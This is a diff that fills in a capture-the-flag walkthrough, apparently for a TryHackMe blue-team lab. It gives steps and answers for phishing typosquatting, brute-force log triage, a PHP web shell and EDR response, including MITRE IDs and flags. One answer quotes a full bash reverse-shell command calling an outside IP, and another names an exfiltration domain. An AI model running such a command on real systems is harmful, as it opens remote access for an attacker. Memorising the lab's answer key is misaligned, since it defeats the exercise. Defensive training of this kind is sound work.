@@ -100,15 +100,17 @@ This guide contains the answer and steps necessary to get to them for the [First
 
 2.  What technique did the attacker use to make the message seem legitimate?
 
+    If we look at the sender of the email, we can see that it closely resembles the legitimate domain. However, it replaces one or a few characters with another character while still having it look visually similar to the original.
+
+    TYPO
     
-    
-    ><details><summary>Click for answer</summary></details>
+    ><details><summary>Click for answer</summary>Typosquatting</details>
 
 3.  Which MITRE technique and sub-technique ID best fit this sender address trick?
 
+    If we look for any mentioning of typosquatting in the MITRE framework, we find the technique "Acquire Infrastructure: Domains". One of these sub-techniques are relevant to the used technique.
 
-
-    ><details><summary>Click for answer</summary></details>
+    ><details><summary>Click for answer</summary>T1583.001</details>
 
 4.  What is the file extension of the attached file?
 
@@ -184,81 +186,113 @@ This guide contains the answer and steps necessary to get to them for the [First
 
 1.  What is the IP address that initiated the brute force on the CRM web portal?
 
+    If we open the log file, we can filter on status code '401'. This might indicate a brute force login attempt. From the list, we can see which IP address initiated this attack.
 
+    IP
 
-    ><details><summary>Click for answer</summary></details>
+    ><details><summary>Click for answer</summary>34.67.91.83</details>
 
 2.  How many successful and failed logins are seen in the logs? Answer Example: 42, 56
 
+    For this answer, we should filter the logs on the login page. Then we can look at the count of hits returning a status code of 200 and 401 respectively.
 
+    LOGIN
 
-    ><details><summary>Click for answer</summary></details>
+    ><details><summary>Click for answer</summary>18, 35</details>
 
 3.  Following the brute force, which user-agent was used for the file upload?
 
+    Lets filter the logs on the IP address we found earlier. Then we filter it on any request containing 'upload'. This gives us a short list with our user-agent.
 
+    UPLOAD
 
-    ><details><summary>Click for answer</summary></details>
+    ><details><summary>Click for answer</summary>python-requests/2.31.0</details>
 
 4.  What was the name of the suspicious file uploaded by the attacker?
 
+    In the previous image, we can see which file was uploaded by the attacker.
 
-
-    ><details><summary>Click for answer</summary></details>
+    ><details><summary>Click for answer</summary>invoice.php</details>
 
 5.  At what time did the attacker first invoke the uploaded script? Answer Example: 2025-10-24 15:35:50
 
+    From the list we see, the second one actually invokes the script on the server.
 
-
-    ><details><summary>Click for answer</summary></details>
+    ><details><summary>Click for answer</summary>2025-11-06 14:27:34</details>
 
 6.  What is the first decoded command the attacker ran on the CRM?
 
 
 
-    ><details><summary>Click for answer</summary></details>
+    COMMAND
+
+    ><details><summary>Click for answer</summary>whoami</details>
 
 7.  Based on the attacker’s activity on the CRM, which MITRE ATT&CK Persistence sub-technique ID is most applicable?
 
+    If we look at the recent detections on the [EDR](https://static-labs.tryhackme.cloud/apps/portal-drop-edr/) website, we can see multiple entries. We are looking for something related to persistence. Hence we take an interest in the first entry (file write: backdoor).
 
+    Opening this entry we can see which tactic and technique this is related to. We can look this up on the MITRE website to get the number associated with it.
 
-    ><details><summary>Click for answer</summary></details>
+    PORTAL TECHNIQUE
+
+    ><details><summary>Click for answer</summary>T1505.003</details>
 
 8.  Which process image executes attacker commands received from the web?
 
+    If we look at the second detection entry (shell spawn), we can see several commands that have been executed by the attacker on the machine. If we look at the initiating process, the details pane gives us the image.
 
+    PORTAL IMAGE
 
-    ><details><summary>Click for answer</summary></details>
+    ><details><summary>Click for answer</summary>/usr/sbin/php-fpm7.4</details>
 
 9.  What command allowed the attacker to open a bash reverse shell?
 
+    In the same entry, we can see another command that is executed, which effectively spawns a reverse shell on the machine. 
 
+    PORTAL SHELL
 
-    ><details><summary>Click for answer</summary></details>
+    ><details><summary>Click for answer</summary>bash -i >& /dev/tcp/115.58.148.86/8080 0>&1</details>
 
 10.  Which Linux user executes the entered malicious commands?
 
+    From the image above, we can also make out the user that issued the command.
 
-
-    ><details><summary>Click for answer</summary></details>
+    ><details><summary>Click for answer</summary>www-data</details>
 
 11.  What sensitive CRM configuration file did the attacker access? 
 
+    If we look at the next detection entry, we can see this is related to discovery. Indicating the attacker was snooping around. Here we can indeed see they were looking around for configuration files.
 
+    PORTAL FIND
 
-    ><details><summary>Click for answer</summary></details>
+    They found one of the sensitive configuration files and tried to read it.
+
+    PORTAL CAT
+
+    ><details><summary>Click for answer</summary>/etc/trycrm/config.json</details>
 
 12.  Which domain was used to exfiltrate the CRM portal database?
 
+    The last command issued in this entry is a curl command. Usefull when extracting information. In this command we can see which domain the attacker is sending the data to.
 
+    PORTAL CURL
 
-    ><details><summary>Click for answer</summary></details>
+    ><details><summary>Click for answer</summary>portaldrop2025.xyz</details>
 
 13.  What flag do you get after completing all 12 EDR response actions?
 
+    For the first entry we want to analyze the root cause and stop the malicious file quarantining it.
 
+    For the second entry we must first terminate the connection from the bash command. Then we should also block the ip it is connected to.
+    
+    For the thirds entry we should isolate the host so the DFIR team can analyse the data. We must also block the related ip address. Then we should also analyse the root cause.
 
-    ><details><summary>Click for answer</summary></details>
+    For the fourth and final entry we should contact the user related to the login, review the changes made the the nginx configuration, and close it as a false positive if the actions taken are approved.
+
+    PORTAL FLAG
+
+    ><details><summary>Click for answer</summary>THM{p0rtal_dropp3d?}</details>
 
 ### Zero Tolerance
 
@@ -266,7 +300,7 @@ This guide contains the answer and steps necessary to get to them for the [First
 
 
 
-    ><details><summary>Click for answer</summary></details>
+    ><details><summary>Click for answer</summary>JP-BROWN-WS</details>
 
 2.  What MITRE subtechnique ID describes the initial code execution on the beachhead?
 
